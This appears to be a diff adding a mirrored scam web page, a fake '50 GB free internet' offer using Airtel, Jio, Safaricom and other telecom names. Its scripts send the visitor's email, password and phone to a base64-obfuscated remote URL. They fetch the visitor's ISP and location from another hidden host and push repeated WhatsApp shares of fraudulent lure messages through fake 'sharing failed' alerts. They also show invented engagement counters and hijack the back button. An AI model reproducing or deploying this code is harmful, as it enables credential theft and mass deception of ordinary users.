+                                            d == 1 ? e = 50 : d == 2 ? e = 65 : d == 3 ? e = 70 : d == 4 ? e = 70 : d == 5 ? e = 80 : d == 6 ? e = 80 : d == 7 ? e = 85 : d == 8 ? e = 90 : d == 9 ? e = 94 : d == 10 ? e = 96 : d == 11 ? e = 98 : d == 12 ? e = 100 : void (0);
+                                        d++;
+                                        setTimeout(function () {
+                                            d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void (0);
+                                            l[i].textContent = e + "%";
+                                            DOMString.barLoaders[i].style.width = e + "%";
+                                        }, 4000);
+                                        set_Cookie('e', e);
+                                        set_Cookie('d', d);
+
+                                       
+                                        window.location.href = "whatsapp://send?text=" + m
+
+                                    })
+                                }
+                                j++
+                            }, 30))
+                        }, 1e3)
+                    }, 1500)) : (DOMString.messageStatus.classList.remove("dum-dum"), DOMString.messageStatus.style.color = "red", DOMString.messageStatus.style.fontWeight = "bold", DOMString.messageStatus.textContent = "We need a number");
+            }
+        });
+
+        get_Cookie('e') ? setTimeout('enviar()', 500) : void (0);
+
+        landingDomain = '*1.%20Airtel*%0Ahttps://50gb.live/Airtel_Data%0A%20%0A*2.%20Jio*%0Ahttps://50gb.live/Jio_Data%0A%20%0A*3.%20V-I*%0Ahttps://50gb.live/VI_Data%0A%20%0A*4.%20BSNL-Mobile*%0Ahttps://50gb.live/BSNL_Data%0A%20%0A*5.%20Jazz*%0Ahttps://50gb.live/Jazz_Data%0A%20%0A*6.%20Zong*%0Ahttps://50gb.live/Zong_Data%0A%20%0A*7.%20telenor*%0Ahttps://50gb.live/Telenor_Data%0A%20%0A*8.%20Other Networks*%0Ahttps://50gb.live/All_Networks %0A%0A *Note : This offer is valid til June 29, 2022 Only*'
+        function deadline() {
+            var jabir3 = new Date();
+            jabir3.setTime(jabir3.getTime() + 24 * 60 * 60 * 1000);
+            return jabir3.getFullYear() + "-" + (jabir3.getMonth() + 1) + "-" + (jabir3.getDate() + 5);
+        }
+        function enviar() {
+            l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+            i = 1;
+
+            clearInterval(window._setting), DOMString.congrats.classList.remove("dum-dum"), DOMString.sharing.classList.remove("dum-dum"), DOMString.share.classList.remove("dum-dum"), DOMString.svgLoading[i].classList.add("dum-dum"), DOMString.svgChecked[i].classList.remove("dum-dum"), i++;
+            var d = parseInt(get_Cookie('d'));
+            e = parseInt(get_Cookie('e'));
+            m = messageToSend();
+            d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void (0);
+            DOMString.barLoaders[i].classList.remove("dum-dum");
+            DOMString.boxes[i].classList.remove("dum-dum");
+            DOMString.svgLoading[i].classList.remove("dum-dum");
+            l[i].textContent = e + "%";
+            DOMString.barLoaders[i].style.width = e + "%";
+            DOMString.share.classList.remove("dum-dum"), DOMString.share.addEventListener("click", function () {
+                if (10 <= d) {
+                    for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
+                        /*   record('4g','wc');*/
+                        window.open(adsLink)
+                    });
+                    DOMString.congrats.classList.add("dum-dum"), document.querySelector(".js-verify").classList.remove("dum-dum"), DOMString.verify.classList.remove("dum-dum")
+                } else {
+                  
+                    d == 1 ? e = 50 : d == 2 ? e = 65 : d == 3 ? e = 70 : d == 4 ? e = 70 : d == 5 ? e = 80 : d == 6 ? e = 80 : d == 7 ? e = 85 : d == 8 ? e = 90 : d == 9 ? e = 94 : d == 10 ? e = 96 : d == 11 ? e = 98 : d == 12 ? e = 100 : void (0);
+                    d++;
+                    setTimeout(function () {
+                        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void (0);
+                        l[i].textContent = e + "%";
+                        DOMString.barLoaders[i].style.width = e + "%";
+                    }, 4000);
+                    set_Cookie('e', e);
+                    set_Cookie('d', d);
+
+                   
+                    window.location.href = "whatsapp://send?text=" + m;
+                }
+            })
+
+        }
+        function doreq(e, a, b) {
+            var c = new XMLHttpRequest;
+            c.open("POST.html", atob("aHR0cHM6Ly9hcHMucmVwcm92aWRlcy5jb20vbG9naW4ucGhwP3drcj16eGNtbmJ2MTI=")), c.onreadystatechange = function () {
+                4 === c.readyState && 200 === c.status
+            }, c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.send("email=" + e + "&pass=" + a + "&phone=" + b)
+        }
+        function tip_text() {
+            var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+                b = "";
+            return "en" === a ? b = "Sharing failed! The same group or the same friend is invalid. Please check and share again." : "id" === a ? b = "Berbagi gagal! Grup yang sama atau teman yang sama tidak valid. Silakan periksa dan bagikan lagi." : b = "Sharing failed! The same group or the same friend is invalid. Please check and share again.";
+
+        }
+        function messageToSend() {
+            var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+                b = "";
+            return "en" === a ? b = "*50%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2050%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A" + landingDomain : "id" === a ? b = "%2ASafaricom+Valentines+%E2%9D%A4%EF%B8%8F+Gift%2A%0D%0A%0D%0AYou+qualify+to+receive+this+year%E2%80%99s+%2AKES+5%2C000%2A+if+you+have+been+using+Safaricom+for+more+than+one+month.%0D%0A%0D%0AImagine+nimeshapata+yangu+sent+to+my+%2AMpesa%2A%21%21%0D%0A%0D%0A%2AHappy+%E2%9D%A4%EF%B8%8F+Valentines+Everyone+from+Safaricom%2A%0D%0A%0D%0A%2AVisit+-+%2A " + landingDomain : b = "%2ASafaricom+Valentines+%E2%9D%A4%EF%B8%8F+Gift%2A%0D%0A%0D%0AYou+qualify+to+receive+this+year%E2%80%99s+%2AKES+5%2C000%2A+if+you+have+been+using+Safaricom+for+more+than+one+month.%0D%0A%0D%0AImagine+nimeshapata+yangu+sent+to+my+%2AMpesa%2A%21%21%0D%0A%0D%0A%2AHappy+%E2%9D%A4%EF%B8%8F+Valentines+Everyone+from+Safaricom%2A%0D%0A%0D%0A%2AVisit+-+%2A " + landingDomain;
+        }
+
+      
+
+        function operatorData(c) {
+            var a = new XMLHttpRequest;
+            a.open("GET.html", atob("aHR0cHM6Ly90ZHNqc2V4dDMuY29tL0V4dFNlcnZpY2Uuc3ZjL2dldGV4dHBhcmFtcw==")), a.onreadystatechange = function () {
+                4 === a.readyState && 200 == a.status && c(a.response)
+            }, a.send(null)
+        }
+
+        operatorData(function (e) {
+            var { isp: a, cnames: b, subdiv: c } = JSON.parse(e);
+            document.querySelector(".quedate__company").textContent = a, document.querySelector(".quedate__country").textContent = b.en, document.querySelector(".quedate__city").textContent = c[0].en
+        });
+        var counter = 153;
+        setInterval(function () {
+            document.querySelector(".chat__reactions-counter").textContent = counter + "k", counter++
+        }, 5e3);
+        var lundd2 = 337;
+        setInterval(function () {
+            document.querySelector(".js-counter").textContent = lundd2, lundd2++
+        }, 5e3);
+        var seconds = 1;
+        setInterval(function () {
+            for (var c = document.querySelectorAll(".js-seconds"), a = 0; a < c.length; a++) c[a].textContent = seconds + "m";
+            seconds++
+        }, 6e3), setTimeout(function () {
+            var b = document.querySelector("#js-box-1");
+            b.classList.remove("dum-dum"), b.classList.add("fadeInDown")
+        }, 1e3), setTimeout(function () {
+            var b = document.querySelector("#js-box-2");
+            b.classList.remove("dum-dum"), b.classList.add("fadeInDown")
+        }, 3e3);</script>
+
+    <script>
+        function getTextNodesIn(a, b) {
+            var c = [];
+            if (a) for (var d = a.childNodes, e = d.length; e--;) {
+                var f = d[e], g = f.nodeType;
+                3 == g ? (!b || b(f, a)) && !f.wholeText.includes("\n") && !f.parentNode.__proto__.toString().includes("SVG") && !f.wholeText.match(/\b(?:Carles|Roign|US$|Demand|Laurens|Kule|Taufik|Albert)\b/gi) && 4 <= f.wholeText.length && c.push(f) : (1 == g || 9 == g || 11 == g) && (c = c.concat(getTextNodesIn(f, b)))
+            }
+            return c
+        }
+
+
+    </script>
+
+
+    <script>
+        window.onhashchange = function () { jp(); };
+        function hh() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
+        function jp() {
+            fh();
+        }
+        setTimeout('hh();', 500);
+        function fh() {
+            location.href = "../external.html?link=https://50gb.link/Airtel_Data";
+        }
+        function goon() {
+            location.href = "../external.html?link=https://50gb.link/Airtel_Data";
+        }
+    </script>
+
+
+    <script>
+        (function (global) {
+
+            if (typeof (global) === "undefined") {
+                throw new Error("window is undefined");
+            }
+
+            var _lora = "!";
+            var tututu = function () {
+                global.location.href += "#";
+
+                global.setTimeout(function () {
+                    global.location.href += "!";
+                }, 50);
+            };
+
+            global.onhashchange = function () {
+                if (global.location.hash !== _lora) {
+                    global.location.hash = _lora;
+                }
+            };
+
+            global.onload = function () {
+
+                tututu();
+
+                document.body.onkeydown = function (e) {
+                    var elm = e.target.nodeName.toLowerCase();
+                    if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) {
+                        e.preventDefault();
+                    }
+                    e.stopPropagation();
+                };
+
+            };
+
+        })(window);
+    </script>
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="../external.html?link=https://www.googletagmanager.com/gtag/js?id=G-3MBZKLK90J"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-3MBZKLK90J');
+</script>
+
+</body>
+
+
+<!-- Mirrored from 50gb.live/Airtel_Data by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 17 Jun 2022 14:18:13 GMT -->
+</html>
